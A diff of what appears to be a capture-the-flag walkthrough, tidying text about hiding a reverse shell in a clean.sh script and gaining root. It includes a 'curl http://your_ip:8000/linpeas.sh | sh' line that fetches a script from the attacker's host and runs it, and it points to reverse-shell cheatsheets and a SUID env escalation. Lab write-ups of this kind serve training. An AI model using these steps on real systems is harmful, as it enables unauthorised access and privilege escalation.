@@ -47,7 +47,7 @@ It works!
 So our next step are the following:
 Download the clean.sh script, 
 
-hide a command for a reverseshell inside 
+hide a command for a reverseshell inside (make sure to change the ip and the port)
 (Place to find a reverseshell https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 [![https://imgur.com/MYn1gRG.png](https://imgur.com/MYn1gRG.png)](https://imgur.com/MYn1gRG.png)
@@ -74,7 +74,7 @@ With the command:
 
 curl http://your_ip:8000/linpeas.sh | sh you can get linpeas.sh and execute it.
 
-(Of course you need to download it first https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+(Of course you need to download it first on your hostmachie https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 We find that /usr/bin/env has the SUID binary bit set so we can check that on GTFOBINs (https://gtfobins.github.io/)
 
